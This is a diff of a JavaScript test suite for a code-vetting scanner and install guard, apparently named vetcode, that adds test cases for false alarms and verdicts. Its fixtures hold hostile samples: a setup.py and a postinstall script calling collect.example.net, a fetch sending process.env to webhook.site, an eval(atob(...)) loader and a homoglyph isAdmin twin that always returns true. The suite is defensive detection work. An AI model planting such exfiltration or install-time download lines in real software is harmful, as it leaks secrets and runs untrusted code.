@@ -8,9 +8,11 @@ import os from "node:os";
 import path from "node:path";
 import { spawnSync } from "node:child_process";
 import { vet } from "../skills/vetcode/scripts/lib/index.mjs";
+import { markdown } from "../skills/vetcode/scripts/lib/report.mjs";
 import { lookalike } from "../skills/vetcode/scripts/lib/supply.mjs";
 import { githubChecksum } from "../skills/vetcode/scripts/lib/secrets.mjs";
 import { settleLookalikes } from "../skills/vetcode/scripts/lib/supply.mjs";
+import { verdict, decidesAlone } from "../skills/vetcode/scripts/lib/verdict.mjs";
 import { parseInstalls, parseClones, checkClone, checkPackage, guard, mcpCommands, parseManifests, fromManifest } from "../skills/vetcode/scripts/lib/guard.mjs";
 import { POPULAR_NPM, POPULAR_PYPI } from "../skills/vetcode/scripts/lib/popular.mjs";
 import { staleThreads } from "../action/threads.mjs";
@@ -1181,6 +1183,60 @@ test("fourth-corpus false alarms: env blocks, architecture in a download address
   assert.deepEqual(at("secret-assignment", "db/checksums.json"), []);
 });
 
+test("fifth-corpus false alarms: base branches, blocklists, look-alike letters, key patterns, own actions", async () => {
+  const dir = project({
+    ".git/config": '[remote "origin"]\n\turl = https://github.com/Acme-Org/app.git\n',
+    ".github/workflows/ci.yml": "name: ci\non: pull_request_target\njobs:\n  a:\n    runs-on: ubuntu-latest\n    steps:\n      - run: python helper.py ${{ github.event.pull_request.base.ref }}\n      - run: echo ${{ github.event.pull_request.head.ref }}\n      - uses: acme-org/gh-actions/login@main\n      - uses: someone-else/deploy@main\n",
+    "app/flow/api/setup.py": "import requests\ndef check(base_url, headers):\n    requests.get(f\"{base_url}/models\", headers=headers, timeout=10).raise_for_status()\n",
+    "pkg/setup.py": j("from setuptools import setup\nimport urllib.request\nurllib.request.urlopen('https://collect.example.net/' + __import__('os').getlo", "gin())\nsetup(name='x')\n"),
+    "app/Blocklist.php": "<?php\nreturn [\n    'mailinator.com',\n    'webhook.site',\n    'requestcatcher.com',\n];\n",
+    "app/send.js": j("fetch('https://webhook", ".site/6eb45ce5-b611-4be1-8b96-c2965755662b', { method: 'POST', body: JSON.stringify(process.env) });\n"),
+    "web/Choices.ts": "export const get\u0421hoiceSelector = () => '.choice';\nexport const pick = () => get\u0421hoiceSelector();\n",
+    "web/auth.ts": "export function isAdmin(u) { return u.role === 'admin'; }\nexport function is\u0410dmin(u) { return true; }\n",
+    "src/scrubber.js": "const RULES = [\n  { name: 'rsa', regex: /-----BEGIN RSA PRIVATE KEY-----[\\s\\S]*?-----END RSA PRIVATE KEY-----/g },\n];\n",
+    "src/keys.rs": "const TEST_FAKE_RSA_KEY_0: &str = \"-----BEGIN PRIVATE KEY-----\nMIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQC\n-----END PRIVATE KEY-----\";\n",
+    "src/api.js": "export const API = { accessTokenList: \"GET:/api/token\", accessTokenRevoke: \"POST:/api/token/blacklist\" };\n",
+    "deploy.sh": "PG_PASSWORD=\"$(generate_password)\"\n",
+  });
+  const r = await run(dir);
+  const at = (rule, file) => r.findings.filter(f => f.rule === rule && f.file === file).map(f => `${f.line} ${f.severity}`);
+  assert.deepEqual(at("gha-script-injection", ".github/workflows/ci.yml"), ["8 high"], "the base branch belongs to the repository; the head branch is the author's");
+  assert.deepEqual(r.findings.filter(f => f.rule === "gha-unpinned-action").map(f => f.evidence.trim()), ["- uses: someone-else/deploy@main"], "the organisation's own actions are its own code");
+  assert.deepEqual(at("setup-py-runs-code", "app/flow/api/setup.py"), [], "a module that happens to be called setup.py");
+  assert.deepEqual(at("setup-py-runs-code", "pkg/setup.py"), ["2 high"]);
+  assert.deepEqual(at("mal-oast-endpoint", "app/Blocklist.php"), [], "a blocklist names these hosts");
+  assert.deepEqual(at("mal-oast-endpoint", "app/send.js"), ["1 high"]);
+  assert.deepEqual(at("anom-homoglyph-identifier", "web/Choices.ts"), ["1 medium"], "one name, spelt the same way everywhere: a typo");
+  assert.deepEqual(at("anom-homoglyph-identifier", "web/auth.ts"), ["2 high"], "a twin of a real name");
+  assert.deepEqual(at("secret-private-key", "src/scrubber.js"), [], "a pattern that looks for keys");
+  assert.deepEqual(at("secret-private-key", "src/keys.rs"), ["1 low"], "a key that says it is fake");
+  assert.deepEqual(at("secret-assignment", "src/api.js").concat(at("secret-assignment", "deploy.sh")), []);
+});
+
+test("a verdict takes a rule with a record or two rules on one file; one unproven rule is a lead", async () => {
+  const f = (rule, file, severity = "high", extra = {}) => ({ rule, file, line: 1, severity, category: "malware", confidence: "medium", title: rule, ...extra });
+  assert.ok(decidesAlone("install-script-suspicious") && !decidesAlone("lock-foreign-source") && !decidesAlone("a-rule-written-tomorrow"));
+  const lone = verdict([f("lock-foreign-source", "package-lock.json"), f("xss-inner-html", "a.js", "high", { category: "web" })]);
+  assert.equal(lone.level, null);
+  assert.deepEqual(lone.leads.map(x => x.rule), ["lock-foreign-source"], "a sign, reported, not a verdict; web findings are not signs");
+  assert.equal(verdict([f("install-script-suspicious", "package.json", "critical")]).level, "critical", "a rule with a record decides alone");
+  const two = verdict([f("mal-reverse-shell", "run.sh", "critical"), f("mal-download-chmod-run", "run.sh"), f("gha-script-injection", ".github/workflows/x.yml")]);
+  assert.equal(two.level, "critical", "two rules about one file corroborate each other");
+  assert.deepEqual(two.leads.map(x => x.rule), ["gha-script-injection"]);
+  assert.equal(verdict([f("mal-reverse-shell", "a.sh", "critical"), f("mal-download-chmod-run", "b.sh")]).level, null, "two rules about different files do not");
+  assert.equal(verdict([f("install-script-suspicious", "package.json", "critical", { confidence: "low" })]).level, null, "low confidence decides nothing");
+  // In a report: the verdict is said first, and a lone sign reads as a place to look.
+  const app = project({ ".github/workflows/x.yml": "name: x\non: pull_request_target\njobs:\n  a:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo \"${{ github.event.pull_request.title }}\"\n", "src/a.js": "export const a = 1;\n" });
+  const r = await run(app);
+  assert.equal(r.verdict.level, null);
+  assert.deepEqual(r.verdict.leads.map(x => x.rule), ["gha-script-injection"]);
+  assert.match(markdown(r), /\*\*No verdict\.\*\* 1 sign/);
+  const pkg = project({ "package.json": JSON.stringify({ name: "x", version: "1.0.0", scripts: { postinstall: "curl -s https://collect.example.net/i.sh | sh" } }) });
+  const m = await run(pkg);
+  assert.ok(m.verdict.level, "an install script that pipes a download into a shell is a verdict");
+  assert.match(markdown(m), /\*\*Verdict: (?:likely )?malicious\.\*\*/);
+});
+
 test("guard: Rust crates and Go modules", async () => {
   const p = c => parseInstalls(c, { exists: () => false }).map(x => x.index ? `index ${x.index}` : x.remote ? `remote ${x.remote}` : `${x.eco}:${x.name}${x.want ? "@" + x.want : ""}`);
   assert.deepEqual(p("cargo add serde tokio@1.38 --features full"), ["cargo:serde", "cargo:tokio@1.38"]);
@@ -1208,7 +1264,7 @@ test("guard: Rust crates and Go modules", async () => {
   assert.match(fresh.message, /tiny-util@0\.2\.0 was published 24 hours ago[^]*install tiny-util@0\.1\.0 instead/);
   assert.equal((await guard("cargo add tiny-util@0.1.0", opts)).decision, "allow");
   const odd = await guard("cargo install odd-crate", opts);
-  assert.equal(odd.decision, "deny");
+  assert.equal(odd.decision, "ask", "one rule without a record is a question, not a refusal");
   assert.match(odd.message, /Build script reads SSH keys and posts them \(build\.rs:9\)/);
   assert.match((await guard("go install github.com/acme/tool/cmd/x@latest", opts)).message, /github\.com\/acme\/tool@v1\.4\.0 is reported as malware/, "the module is found above the package path");
   assert.equal((await guard("go get github.com/acme/fresh", opts)).decision, "ask");
@@ -1292,8 +1348,8 @@ test("guard: a repository is read right after it is cloned", async () => {
   assert.deepEqual(at("git status && git pull"), []);
   const bad = project({ "package.json": JSON.stringify({ name: "x", version: "1.0.0", scripts: { postinstall: "node setup.js" } }), "setup.js": j("eval(at", "ob('Y29uc29sZS5sb2coMSk='));\n") });
   const said = await checkClone(bad, { vet });
-  assert.match(said.message, /^vetcode read .* after it was cloned \(\d+ files, nothing was run\) and found \d+ sign/);
-  assert.equal(said.critical, true);
+  assert.match(said.message, /^vetcode read .* after it was cloned \(\d+ files, nothing was run\)/);
+  assert.match(said.message, /setup\.js/);
   const fine = project({ "package.json": JSON.stringify({ name: "y", version: "1.0.0" }), "index.js": "module.exports = 1;\n" });
   assert.equal(await checkClone(fine, { vet }), null, "a clean clone says nothing");
   assert.equal(await checkClone("/no/such/folder", { vet }), null);
